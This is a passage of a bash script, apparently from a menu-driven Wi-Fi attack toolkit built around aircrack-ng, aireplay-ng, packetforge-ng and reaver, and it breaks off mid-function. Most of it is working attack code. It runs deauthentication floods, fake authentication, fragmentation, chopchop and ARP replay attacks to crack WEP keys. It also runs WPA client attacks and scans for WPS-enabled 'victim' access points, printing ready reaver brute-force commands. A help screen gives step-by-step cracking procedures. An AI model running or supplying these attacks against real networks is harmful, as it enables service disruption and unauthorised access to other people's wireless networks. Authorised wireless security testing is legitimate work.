##~~~~~~~~~~~~~~~~~~~ BEGIN wifi_101-- venue-- functions ~~~~~~~~~~~~~~~~~~~~~~##
	wifi_scan--()
	{
	#wifi_ias_pid= ##PID for initial Airodump-NG scan
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
            --Channel Scanning Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Specified Channels [$out$sc$inp]

2) Hop Frequency (ms) [$out$hop$inp]

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read var
	case $var in
		1) echo -e "$inp\nSpecified Channel(s)?\n(ie.. 1) (ie.. 1,2,3) (ie.. 1-14)"
		read sc
		wifi_scan--;;

		2) echo -e "$inp\nHop Frequency in milliseconds?"
		read hop
		wifi_scan--;;

		c|C) if [[ -z $sc || -z $hop ]];then
			echo -e "$wrn\nYou Must Enter the Channels and Hop to Proceed"
			read
			wifi_scan--
		fi;;

		p|P) venue--;;

		m|M) main_menu--;;

		*) wifi_scan--;;
	esac

	Eterm -b black -f white --pause --title "Channel Scan: $sc" -e airodump-ng -f $hop $pii --channel $sc & wifi_ias_pid=$!
	venue--
	}

	dump--()
	{
	parent_IV=
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        --Capture Session Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Tgt Channel      [$out$tc$inp]

2) BSSID {Optional} [$out$b$inp]

3) File Name        [$out$cf$inp]

4) Output Format    [$out$of$inp]

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read var
	case $var in
		1) parent_IV="dump" 
		tchan--;;

		2) echo -e "$inp\nTgt BSSID? (Leave Blank to Null)"
		read b
		dump--;;

		3) parent_IV="dump" 
		cfile--;;

		4) of=
		while [[ -z $of ]];do
			echo -e "$inp\nOutput Format? (pcap, ivs, csv, gps, kismet, netxml)"
			read of
			case $of in
				pcap|ivs|csv|gps|kismet|netxml) ;;
				*) of= ;;
			esac

		done

		dump--;;

		c|C) if [[ -z $tc || -z $cf || -z $of ]];then
			echo -e "$wrn\nTgt Channel & File Name & Output-Format Must be Filled Before Proceeding"
			sleep 1
			dump--
		fi;;

		p|P) venue--;;

		m|M) main_menu--;;

		*) dump--;;
	esac

	kill -9 $wifi_ias_pid
	kill -9 $wifi_dea_pid
	if [[ -z $b ]];then
		Eterm -b black -f white --pause --title "AiroDump Channel: $tc File: $cf Format: $of" -e airodump-ng $pii --channel $tc -w $cf --output-format $of &
	else
		Eterm -b black -f white --pause --title "AiroDump Channel: $tc File: $cf BSSID: $b Format: $of" -e airodump-ng $pii --channel $tc --bssid $b -w $cf --output-format $of &
	fi

	venue--
	}

	wifi_deauth--()
	{
	sc= ## Wireless channel to deauth on
	rb= ## Router BSSID
	#wifi_dea_pid= ## Deauth Scan PID

		wifi_deauth_II--()
		{
		dt= ## DeAuth Type
		cm= ## Client MAC

			wifi_switch_deauth--()
			{
			kill -9 $wifi_dea_pid
			sc=
			while [[ -z $sc ]];do
				echo -e "$inp\nSpecified Channel(s)?\n(ie.. 1) (ie.. 1,2,3) (ie.. 1-14)"
				read sc
			done

			hop=
			while [[ -z $hop ]];do	
				echo -e "$inp\nMilliseconds between channel hops?"
				read hop
			done

			Eterm -b black -f white --pause --title "Channel Scan: $sc" -e airodump-ng -f $hop $pii --channel $sc & wifi_ias_pid=$!
			sleep .7
			wifi_deauth--
			}

			wifi_deauth_III--()
			{
			r_d= ## Repeat DeAuth Variable
			while [[ -z $r_d ]];do
				clear
				echo -e "$inp\n(R)epeat DeAuth\n(C)hange or Add Client for DeAuth\n(S)witch Channel or Change Router BSSID\n(E)xit DeAuth" 
				read r_d
			done

			case $r_d in
				r|R) case $dt in
					b|B) echo -e "$out" 
					aireplay-ng $pii -0 3 -a $rb
					wifi_deauth_III--;;

					c|C) echo -e "$out" 
					aireplay-ng $pii -0 3 -a $rb -c $cm
					wifi_deauth_III--;;
				esac;;

				c|C) clear 
				wifi_deauth_II--;;

				s|S) wifi_switch_deauth--;;

				e|E) venue--;;

				*) wifi_deauth_III--;;
			esac
			}

		while [[ -z $dt ]];do
			clear
			echo -e "$inp\n(B)roadcast Deauth\n(C)lient Targeted DeAuth\n(S)witch Channel or Change Router BSSID\n(E)xit DeAuth"
			read dt
		done

		case $dt in
			b|B) echo -e "$out" 
			aireplay-ng $pii -0 4 -a $rb
			wifi_deauth_III--;;

			c|C) while [[ -z $cm ]];do
				echo -e "$inp\nClient MAC address?"
				read cm
			done

			echo -e "$out"
			aireplay-ng $pii -0 4 -a $rb -c $cm
			wifi_deauth_III--;;

			s|S) wifi_switch_deauth--;;

			e|E) venue--;;

			*) wifi_deauth_II--;;
		esac
		}

	clear

	chan_check-- $pii
	if [[ -n $chan_res ]];then
		echo -e "$out\nCurrent Channel is: $chan_res. $inp Would You Like to Change it? (y/n)"
		read var
		case $var in
			y|Y) tchan--;;
			n|N) tc=$chan_res ;;
			*) venue--;;
		esac

	else
		tchan--
	fi

	if [[ -z $tc ]];then
		venue--
	fi

	sc=$tc

	echo -e "$inp\nRouter BSSID?"
	read rb
	if [[ -z $rb ]];then
		venue--
	fi

	kill -9 $wifi_ias_pid
	kill -9 $wifi_dea_pid
	Eterm -b black -f white --pause --title "Channel Scan: $sc" -e airodump-ng $pii --channel $sc --bssid $rb & wifi_dea_pid=$!
	sleep .7
	wifi_deauth_II--
	clear
	}

	auth--()
	{
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                          --Fake Authentication Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Tgt Channel                                            [$out$tc$inp]

2) BSSID                                                  [$out$b$inp]

3) Source MAC                                             [$out$sm$inp]

4) Re-Authentication Packets per Burst                    [$out$ppb$inp]

5) Re-Authentication Delay in Seconds                     [$out$rd$inp]

6) Keep-Alive Frequency in Seconds                        [$out$kaf$inp]

7) ESSID {Optional, Must be Used if ESSID is Hidden}      [$out$hid_essid$inp]

8) SKA .xor Injection {Optional}                          [$out$ska_xor$inp]

C)ontinue

P)revious Menu 

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read var
	case $var in
		1) chan_check-- $pii
		if [[ -n $chan_res ]];then
			echo -e "$out\nCurrent Channel is: $chan_res.$inp  Would You Like to Change it? (y/n)"
			read var
			case $var in
				y|Y) tchan--;;
				n|N) tc=$chan_res ;;
				*) auth--;;
			esac

		else
			tchan--
		fi

		if [[ -z $tc ]];then
			auth--
		else
			iwconfig $pii channel $tc
			auth--
		fi;;

		2) echo -e "$inp\nTgt BSSID?"
		read b
		auth--;;

		3) echo -e "$inp\nSource MAC?"
		read sm
		auth--;;

		4) ppb=
		while [[ -z $ppb ]];do
			echo -e "$inp\nRe-Authentication Packets per Burst? (1=Single 0=Multiple)"
			read ppb
			case $ppb in
				1|0) ;;
				*) ppb= ;;
			esac

		done

		auth--;;

		5) echo -e "$inp\nRe-Authentication Delay in Seconds?"
		read rd
		auth--;;

		6) echo -e "$inp\nKeep-Alive Frequency in Seconds?"
		read kaf
		auth--;;

		7) echo -e "$inp\nEnter Hidden ESSID (Leave Blank to Null)"
		read hid_essid
		auth--;;

		8) echo -e "$inp\n.xor file? (Leave Blank to Null)"
		read ska_xor
		auth--;;

		c|C) if [[ -z $tc || -z $b || -z $sm || -z $ppb || -z $rd || -z $kaf ]];then
			echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
			sleep 1
			auth--
		fi;;

		p|P) venue--;;

		m|M) main_menu--;;

		*) auth--;;
	esac

	if [[ -z $hid_essid && -z $ska_xor ]];then
		Eterm -b black -f white --pause --title "Fake Auth" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm &
	elif [[ -z $ska_xor ]];then
		Eterm -b black -f white --pause --title "Fake Auth Hidden ESSID" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -e "$hid_essid" &
	elif [[ -z $hid_essid ]];then
		Eterm -b black -f white --pause --title "Fake Auth w/SKA .xor" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -y $ska_xor &
	else
		Eterm -b black -f white --pause --title "Fake Auth Hidden ESSID w/SKA .xor" -e aireplay-ng $pii -1 $rd -o $ppb -q $kaf -a $b -h $sm -y $ska_xor -e "$hid_essid" &
	fi

	venue--
	}

	rtech--()
	{
	#rt= ## Router Technique
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~
Router Technique Selection
~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Fragmentation Attack

2) Chop Attack

3) ARP Replay Attack

4) Broadcast Attack

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read rt
	case $rt in
		1|2|3|4) rppb=500 ## Replayed packets per burst
		case $rt in
			1|2) parent_II="fragchop";;
			3|4) parent_II="broadarp";;
		esac

		e=
		rtech_II--;;

		p|P) venue--;;

		m|M) main_menu--;;
		
		*) rtech--;;
	esac
	}

	pforge--()
	{
	nowdate=$(date +%M%S) ## Timestamp for files
	pf_var= ## variable name for -w filename

		pforge_S--()
		{
		clear
		echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      --Simple Packet Forging Options--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Tgt BSSID      [$out$b$inp]

2) Source MAC     [$out$sm$inp]

3) .xor filename  [$out$xor$inp]

C)ontinue

P)revious Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
		read var
		case $var in
			1) echo -e "$inp\nTgt BSSID?"
			read b
			pforge_S--;;

			2) echo -e "$inp\nSource MAC?"
			read sm
			pforge_S--;;

			3) echo -e "$inp\n.xor filename?"
			read xor
			pforge_S--;;

			c|C) if [[ -z $b || -z $sm || -z $xor ]];then
				echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
				sleep 1
				pforge_S--
			fi;;

			p|P) pforge--;;

			*) pforge_S--;;
		esac
		}

		pforge_A--()
		{
		clear
		echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     --Advanced Packet Forging Options--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Tgt BSSID      [$out$b$inp]

2) Source MAC     [$out$sm$inp]

3) .xor filename  [$out$xor$inp]

4) Source IP      [$out$src_ip$inp]

5) Destination IP [$out$dst_ip$inp]

C)ontinue

P)revious Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
		read var
		case $var in
			1) echo -e "$inp\nTgt BSSID?"
			read b
			pforge_A--;;

			2) echo -e "$inp\nSource MAC?"
			read sm
			pforge_A--;;

			3) echo -e "$inp\n.xor filename?"
			read xor
			pforge_A--;;

			4) echo -e "$inp\nSource IP?"
			read src_ip
			ip_mac-- ip $src_ip
			if [[ $ip_mac == "fail" ]];then
				src_ip=
			fi

			pforge_A--;;

			5)echo -e "$inp\nDestination IP?"
			read dst_ip
			ip_mac-- ip $dst_ip
			if [[ $ip_mac == "fail" ]];then
				dst_ip=
			fi

			pforge_A--;;

			c|C) if [[ -z $xor || -z $src_ip || -z $dst_ip ]];then
				echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
				sleep 1
				pforge_A--
			fi;;

			p|P) pforge--;;

			*) pforge_A--;;
		esac
		}

	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   --Packet Forging Mode--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Simple Mode {Recommended}

2) Advanced Mode

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read var
	case $var in
		1) p_mode="simple" ;;
		2) p_mode="advanced" ;;
		p|P) p_mode="venue" ;;
		m|M) p_mode="main" ;;
	esac

	case $p_mode in
		simple) pforge_S--;;
		advanced) pforge_A--;;
	esac

	echo -e "$out"
	case $p_mode in
		simple) packetforge-ng -0 -a $b -h $sm -k 255.255.255.255 -l 255.255.255.255 -y $xor -w $nowdate\arp-request ;;
		advanced) packetforge-ng -0 -a $b -h $sm -k $dst_ip -l $src_ip -y $xor -w arp-request ;;
	esac

	case $p_mode in
		simple|advanced) while [[ -z $pf_var ]];do
			echo -e "$inp\nWhat was the name of the file just created?"
			read pf_var
		done

		venue--;;

		venue) venue--;;

		main) main_menu--;;
	esac
	}

	forge_out--()
	{
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
           --Forged Packet Injection Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Replayed Packets per Burst [$out$rppb$inp]

2) Packetforge-NG Filename    [$out$pf_var$inp]

3) Source MAC                 [$out$sm$inp]

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read var
	case $var in
		1) echo -e "$inp\nReplayed Packets per Burst?"
		read rppb
		if [[ $rppb -gt 1000 ]];then
			rppb=1000
		elif [[ $rppb -lt 1 ]];then
			rppb=1
		fi
		forge_out--;;

		2) echo -e "$inp\nPacketforce-NG Filename?"
		read pf_var
		forge_out--;;

		3) echo -e "$inp\nSource MAC?"
		read sm
		forge_out--;;

		c|C) if [[ -z $rppb || -z $pf_var || -z $sm ]];then
			echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
			sleep 1
			forge_out--
		fi;;

		p|P) venue--;;

		m|M) main_menu--;;

		*) forge_out--;;
	esac


	Eterm -b black -f white --pause --title "Forged Packet Attack" -e aireplay-ng $pii -2 -r $pf_var -x $rppb -h $sm &
	venue--
	}

	ctech--()
	{
	#ct= ## Client technique
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~
Client Technique Selection
~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Hirte (AP)

2) Hirte (Ad-Hoc)

3) Cafe-Latte

4) Shared-Key PRGA Capture

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read ct
	case $ct in
		1|2|3|4) ctech_II--;;
		p|P) venue--;;
		m|M) main_menu--;;
		*) ctech--;;
	esac
	}

	crack--()
	{
	clear
	parent_V= ## Nulled to prevent repeat looping that is NOT wanted!
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
           --WEP Crack Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Tgt BSSID   [$out$b$inp]

2) File Name   [$out$cf$inp]

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read var
	case $var in
		1) echo -e "$inp\nTgt BSSID?"
		read b
		crack--;;

		2) parent_V="crack"
		cfile--;;

		c|C) if [[ -z $b || -z $cf ]];then
			echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
			sleep 1
			crack--
		else
			Eterm -b black -f white --pause --title "WEP Crackin BSSID: $b File: $cf" -e aircrack-ng -a 1 -b $b $cf* &
			crack--
		fi;;

		p|P) venue--;;

		m|M) main_menu--;;

		*) crack--;;
	esac
	}

	WPA--()
	{
	#wifu= ## WPA Client Attack Method
	e= ## Desired ESSID
	#enc_type= ## Encryption Type
	#spec= ## Variable for WPA_II()
	all_probe= ## Respond to all probes
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
          --WPA Client Attack Techniques--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) WPA (Specified ESSID)

2) WPA2 (Specified ESSID)

3) All Tags (Specified ESSID)

4) WPA (Responding to All Broadcast Probes)

5) WPA2 (Responding to All Broadcast Probes)

6) All Tags (Responding to All Broadcast Probes)

7) d'Otreppe WPA (Specified ESSID)

8) d'Otreppe WPA2 (Specified ESSID)

9) d'Otreppe All Tags (Specified ESSID)

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
	read wifu
	case $wifu in
		1|4|7) enc_type='-z 2';;
		2|5|8) enc_type='-Z 4';;
		3|6|9) enc_type='-0';;
		p|P) venue--;;
		m|M) main_menu--;;
		*) WPA--;;
	esac

	case $wifu in
		1|2|3|7|8|9) spec="1"
		while [[ -z $e ]];do
			echo -e "$inp\nDefine ESSID"
			read e
		done;;

		4|5|6) spec=2
		all_probe='-P -C 60';;
	esac

	chan_check-- $pii
	if [[ -n $chan_res ]];then
		echo -e "$out\nCurrent Channel is: $chan_res.$inp  Would You Like to Change it? (y/n)"
		read var
	else
		tchan--
	fi

	case $var in
		y|Y) tchan--;;
		n|N) tc=$chan_res ;;
		*) WPA--;;
	esac

	if [[ -z $tc ]];then
		WPA--
	fi

	WPA_II--
	}

	wacg--()
	{
	pidfile="/tmp/WACg/airo.pid"
	capture="airodump-ng -w /tmp/WACg/capture $pii --output-format csv,netxml"
	my_mac=$(macchanger -s $pii |cut -d" " -f3)

		countdown--()
		{
		IFS=:
		set -- $*
		secs=$(( ${1#0} ))
		while [ $secs -gt 0 ]; do
			sleep 1 &
			printf "\r[*] Time remaining - %02d:%02d:%02d" $((secs/3600)) $(( (secs/60)%60)) $((secs%60))
			secs=$(( $secs - 1 ))
			wait
		done
		}

		wacg_scan--()
		{
		shred -u /tmp/WACg/* > /dev/null 2>&1
		rm -r /tmp/WACg >/dev/null 2>&1
		mkdir /tmp/WACg > /dev/null 2>&1
		$capture &>/dev/null &
		PID=$!
		echo $PID > "$pidfile" &
		echo -e "$out"
		countdown-- "$cnt_time" & sleep $cnt_time && echo -e "$out\n[>] Done!!\n" &&

		for pidkill in $(cat $pidfile); do
			(kill -9 $pidkill 2>/dev/null) &    # Dirty but supresses kill output
			wait $pidkill 2>/dev/null           #
		done

		## Split up capture and clean up
		## AP Fields: BSSID,channel,Privacy,Cipher,beacons,IV,ESSID
		## Client Fields: Station MAC,Power,packets,BSSID,Probed ESSIDs
		## Add flags to AP's for Clients and WPS
		cat /tmp/WACg/capture-01.csv | tr -d " " | grep -a WPA | cut -d"," -f 1,4,6-7,10-11,14 | sed 's/$/,/' >> /tmp/WACg/AP-WPA.txt
		#Associated Client List
		cat /tmp/WACg/capture-01.kismet.netxml | grep "<client-mac>" | cut -d">" -f2 | cut -d"<" -f1 >> /tmp/WACg/client-tmp.txt
		for client in $(cat /tmp/WACg/client-tmp.txt); do
			(cat /tmp/WACg/capture-01.csv |grep -a $client >> /tmp/WACg/clients-tmp.txt) > /dev/null 2>&1
		done

		(cat /tmp/WACg/clients-tmp.txt |tr -d " " |cut -d"," -f1,4-7 >> /tmp/WACg/clients.txt) > /dev/null 2>&1
		## Set client flag for AP's (Y/N)
		for cliY in $(cat /tmp/WACg/clients.txt |cut -d"," -f4 |uniq); do
			sed -i "/^$cliY/ s/\$/Yes/" /tmp/WACg/AP-WPA.txt
		done

		for cliN in $(cat /tmp/WACg/AP-*.txt |cut -d"," -f1-8 |egrep -a -v "Yes" |cut -d"," -f1); do
			sed -i "/^$cliN/ s/\$/No /" /tmp/WACg/AP-WPA.txt
		done

		## Set WPA WPS flag for reaver (Y/N)
		wash -f /tmp/WACg/capture-*.cap -C >> /tmp/WACg/wps_tmp.txt >/dev/null 2>&1
		cat /tmp/WACg/wps_tmp.txt |grep ":" |tr ' ' ',' |sed 's/,,,,,,/,/g' |sed 's/,,,,,,/,/g' |sed 's/,,/,/g' |sed 's/,,/,/g' |sed 's/,,/,/g' >> /tmp/WACg/wps.txt
		sed -i 's/$/,/' /tmp/WACg/AP-WPA.txt
		for wpsY in $(cat /tmp/WACg/wps.txt |cut -d"," -f1); do
			sed -i "/^$wpsY/ s/\$/Yes/" /tmp/WACg/AP-WPA.txt
		done

		for wpsN in $(cat /tmp/WACg/AP-WPA.txt |cut -d"," -f1-7,9 |egrep -a -v "Yes" |cut -d"," -f1); do
			sed -i "/^$wpsN/ s/\$/No /" /tmp/WACg/AP-WPA.txt
		done

		wacg_check="active"
		## Display Networks
		echo -e "$out\nAvailable WPA-Networks:$ins\n[If ESSID is empty the network is hidden!]\n$out"
		cat /tmp/WACg/AP-WPA.txt |awk -F, '{print "BSSID: " $1 "\tChannel: " $2 "\tClients: " $8  "\tWPS: " $9 "\tESSID: " $7}'
		wacg_II--
		}

		wacg_II--()
		{
		var_II=
		while [[ -z $var_II ]];do
			echo -e "$inp\n\n\n(C)ontinue, (R)escan, or (P)revious Menu?"
			read var
			case $var in
				c|C)var_II=1 ;;

				p|P) venue--;;

				r|R)var_II=1
				clear
				wacg_scan--;;
			esac

		done

		echo -e "$inp\n[>] Select victim AP MAC address"
		echo -n "MAC: "
		read -e vic_mac
		vic_chan=$(grep -a $vic_mac /tmp/WACg/AP-*.txt |cut -d"," -f2)
		echo -e "$inp\n[>] Use (R)eaver or (A)ireplay-ng to associate with the target"
		read -e wacg_asc
		case $wacg_asc in
			r|R) clear 
			echo -e "$ins\nreaver -i $pii --delay=0 --dh-small --lock-delay=250 --fail-wait=250 --eap-terminate -v -c $vic_chan -b $vic_mac\n\n\n$hdr"
			read -p "[>] Return to Main Menu press [Enter]..." readEnterKey 
			venue--;;

			a|A) clear
			echo -e "$ins\niwconfig $pii $vic_chan"
			echo "aireplay-ng -1 4 -o 1 -q 2 -a $vic_mac -h $my_mac $pii"
			echo "reaver -i $pii --delay=0 --dh-small --lock-delay=250 --fail-wait=250 --eap-terminate -v -A -b $vic_mac"
			echo -e "\n\n$hdr"
			read -p "[>] Return to Main Menu press [Enter]..." readEnterKey 
			venue--;;
		esac
		}

	clear
	var=
	while [[ -z $var ]];do
		echo -e "$inp\nAiroDump-NG Scanning Time?"
		read cnt_time
		if [[ -z $cnt_time ]];then
			cnt_time=10
			var=1
		fi

		if [ $cnt_time -eq $cnt_time > /dev/null 2>&1 ];then
			var=1
		fi

	done

	wacg_scan--
# 	wacg_II--
	}

	lists--()
	{
	clear
	echo -e "$ins
SM - Desired Source MAC
AP - Access Point

Activate capture file on desired channel/bssid

Use aireplay-ng to do a fake authentication with the access point [-1 6000 -q 5 -a "AP" -h "SM"]

Fake SKA Authentication
	a. Deauthenticate a connected client to grab a xor
	b. Authenticate via the xor [-1 6000 -q 5 -a "AP" -h "SM" -y "xor"]
	c. Fragment the xor against the AP to create a new xor [-5 -b "AP" -h "SM"]
	d. Packetforge the new xor [-0 -a "AP" -h "SM" -k {dest} "255.255.255.255" -l {src} "255.255.255.255" -y "new_xor" -w "arp_request"] 
	e. Replay the forged arp_request packet against the AP [-2 -b "AP" -h "SM" -y "arp_request"]

If using standard ARP replays or Broadcast attacks, then:
	a. Run aircrack-ng to crack key using the IVs collected

If using chopchop or a fragmentation attack, then:
	a. Obtain the PRGA .xor
	b. Packetforge the .xor [-0 -a "AP" -h "SM" -k {dest} "255.255.255.255" -l {src} "255.255.255.255" -y "new_xor" -w "arp_request"]
	c. Replay the forged arp_request packet against the AP [-2 -b "AP" -h "SM" -y "arp_request"]
	d. Run aircrack-ng to crack key using the IVs collected

For ARP amplification run a chopchop attack and decrypt the .cap file it creates:
	a. tcpdump -s 0 -n -e -r chopchop.cap
	b. Packetforge the .xor [-0 -a "AP" -h "SM" -k {dest} -l {src} -y "new_xor" -w "arp_request"]"
	read
	venue--
	}
##~~~~~~~~~~~~~~~~~~~~ END wifi_101-- venue-- functions ~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~ BEGIN wifi_101-- rtech-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~##
	rtech_II--()
	{
	clear
	case $parent_II in
		fragchop) echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      --Attack Generation Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Tgt Channel      [$out$tc$inp]

2) Source MAC       [$out$sm$inp]

3) Tgt BSSID        [$out$b$inp]

4) ESSID {Optional} [$out$e$inp]

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
		read var
		case $var in
			1) parent_III="rtech" 
			tchan--;;

			2) echo -e "$inp\nSource MAC?"
			read sm
			rtech_II--;;

			3) echo -e "$inp\nTgt BSSID?"
			read b
			rtech_II--;;

			4) echo -e "$inp\nTgt ESSID? (Leave Blank to Null)"
			read e
			rtech_II--;;

			c|C) if [[ -z $tc || -z $sm || -z $b ]];then
				echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
				sleep 1
				rtech_II--
			fi;;

			p|P) rtech--;;

			m|M) main_menu--;;

			*) rtech_II--;;
		esac;;

		broadarp) echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                     --Attack Generation Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Replayed Packets per Burst {500 is Recommended} [$out$rppb$inp]

2) Tgt Channel                                     [$out$tc$inp]

3) Source MAC                                      [$out$sm$inp]

4) Tgt BSSID                                       [$out$b$inp]

5) ESSID {Optional}                                [$out$e$inp]

C)ontinue

P)revious Menu

M)ain Menu$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$inp"
		read var
		case $var in
			1) echo -e "$inp\nReplayed Packets per Burst?"
			read rppb
			if [[ $rppb -gt 1000 ]];then
				rppb=1000
			elif [[ $rppb -lt 1 ]];then
				rppb=1
			fi
			rtech_II--;;

			2) parent_III="rtech" 
			tchan--;;

			3) echo -e "$inp\nSource MAC?"
			read sm
			rtech_II--;;

			4) echo -e "$inp\nTgt BSSID?"
			read b
			rtech_II--;;

			5) echo -e "$inp\nTgt ESSID? (Leave Blank to Null)"
			read e
			rtech_II--;;

			c|C) if [[ -z $rppb || -z $tc || -z $sm || -z $b ]];then
				echo -e "$wrn\nAll Fields Must be Filled Before Proceeding"
				sleep 1
				rtech_II--
			fi;;

			p|P) rtech--;;

			m|M) main_menu--;;

			*) rtech_II--;;
		esac

		parent_II= ;; ## Nulled to prevent repeat looping that is NOT wanted!
	esac

	rtech_III--
	}

	rtech_III--()
	{
	st_1--
	iwconfig $pii channel $tc

	case $rt in
		1) frag_gen--;;
		2) chop_gen--;;
		3) arp_out--;;
		4) broad_out--;;
	esac
	
	rtech--
	}

	## Frag sub-functions
	frag_gen--()
	{
	if [[ -z $e ]];then
		Eterm -b black -f white --pause --title "Fragmentation Attack BSSID: $b" -e aireplay-ng -5 -b $b -h $sm $pii &
	else
		Eterm -b black -f white --pause --title "Fragmentation Attack ESSID: $e" -e aireplay-ng -5 -b $b -e "$e" -h $sm $pii &
	fi
	}

	## Chop sub-functions
	chop_gen--()
	{
	if [[ -z $e ]];then
		Eterm -b black -f white --pause --title "ChopChop Attack BSSID: $b" -e aireplay-ng -4 -b $b -h $sm $pii &
	else
		Eterm -b black -f white --pause --title "ChopChop Attack ESSID: $e" -e aireplay-ng -4 -b $b -e "$e" -h $sm $pii &
	fi
	}

	## ARP sub-function
	arp_out--()
	{
	Eterm -b black -f white --pause --title "ARP Attack" -e aireplay-ng $pii -3 -b $b -x $rppb -h $sm &
	}

	## Broadcast Attack sub-function
	broad_out--()
	### We need to add in a question whether or not they want the packets specifically pointing at the wired distribution side of the house via -t 1
	{
	Eterm -b black -f white --pause --title "Broadcast Attack" -e aireplay-ng $pii -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $b -x $rppb -h $sm &
	}

##~~~~~~~~~~~~~~~~ END wifi_101-- rtech-- sub-functions ~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~ BEGIN wifi_101-- ctech-- sub-functions ~~~~~~~~~~~~~~~~~~~~~##
	ctech_II--()
	{
	parent_VI= ## Nulled to prevent repeat looping that is NOT wanted!
	#e= ## tgt essid
	clear
	echo -e "$hdr
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   --Packet Injection Parameters--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$inp
1) Tgt Channel  [$out$tc$inp]

